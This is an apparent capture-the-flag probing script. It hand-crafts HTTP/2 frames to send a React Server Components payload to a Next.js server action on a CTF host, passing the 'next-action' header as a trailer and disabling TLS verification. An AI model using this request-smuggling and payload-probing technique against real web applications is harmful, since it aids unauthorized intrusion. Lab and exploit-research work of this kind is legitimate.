#!/usr/bin/env python3
"""Dump the 200 response from `["$K1"]` body for inspection."""
import socket, ssl, struct, time
from hpack import Encoder

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443

with open("/tmp/funi.actionid") as f:
    ACTION_ID = f.read().strip()

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


def open_h2():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    raw = socket.create_connection((HOST, PORT), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    sock.sendall(PREFACE)
    sock.sendall(b"\x00\x00\x00\x04\x00\x00\x00\x00\x00")
    return sock


def call(body_bytes, content_type="text/plain;charset=UTF-8"):
    sid = 1
    enc = Encoder()
    headers = [
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", content_type),
        ("content-length", str(len(body_bytes))),
        ("trailer", "next-action"),
        ("user-agent", "dump"),
    ]
    head_block = enc.encode(headers)
    trailer_block = enc.encode([("next-action", ACTION_ID)])

    sock = open_h2()
    sock.settimeout(2)
    try:
        sock.recv(65536)
    except Exception:
        pass
    sock.settimeout(15)
    raw = struct.pack(">I", len(head_block))[1:] + b"\x01" + bytes([0x04]) + struct.pack(">I", sid) + head_block
    sock.sendall(raw)
    raw = struct.pack(">I", len(body_bytes))[1:] + b"\x00" + bytes([0x00]) + struct.pack(">I", sid) + body_bytes
    sock.sendall(raw)
    raw = struct.pack(">I", len(trailer_block))[1:] + b"\x01" + bytes([0x05]) + struct.pack(">I", sid) + trailer_block
    sock.sendall(raw)

    sock.settimeout(15)
    buf = b""
    deadline = time.time() + 15
    while time.time() < deadline:
        try:
            chunk = sock.recv(65536)
        except (socket.timeout, OSError):
            break
        if not chunk:
            break
        buf += chunk
    sock.close()

    # Parse frames
    body = b""
    headers_out = []
    pos = 0
    from hpack import Decoder
    dec = Decoder()
    status = None
    while pos < len(buf):
        if len(buf) - pos < 9:
            break
        length = int.from_bytes(buf[pos:pos+3], "big")
        ftype = buf[pos+3]
        flags = buf[pos+4]
        sid_ = int.from_bytes(buf[pos+5:pos+9], "big") & 0x7fffffff
        payload = buf[pos+9:pos+9+length]
        pos += 9 + length
        if ftype == 1:
            data = payload
            if flags & 0x8:
                pad_len = data[0]
                data = data[1:-pad_len] if pad_len else data[1:]
            if flags & 0x20:
                data = data[5:]
            try:
                hdrs = dec.decode(data)
                headers_out.extend(hdrs)
                for k, v in hdrs:
                    sk = k.decode() if isinstance(k, bytes) else k
                    sv = v.decode() if isinstance(v, bytes) else v
                    if sk == ":status":
                        status = sv
            except Exception:
                pass
        elif ftype == 0:
            data = payload
            if flags & 0x8:
                pad_len = data[0]
                data = data[1:-pad_len] if pad_len else data[1:]
            body += data
    return status, headers_out, body


# Dump no-error response
print("\n# `[\"$K1\"]` body -> action with empty FormData (no error)")
status, hdrs, body = call(b'["$K1"]')
print(f"status={status}")
for k, v in hdrs:
    sk = k.decode() if isinstance(k, bytes) else k
    sv = v.decode() if isinstance(v, bytes) else v
    print(f"  {sk}: {sv}")
out_path = "/Users/airp0wer/Projects/alfa-ctf-2026/tasks-2026/funicular/artifacts/p32_K1_response.bin"
with open(out_path, "wb") as f:
    f.write(body)
print(f"\n# Saved {len(body)} bytes to {out_path}")
print("\n# First 2000 bytes:")
print(body[:2000].decode("utf-8", "replace"))
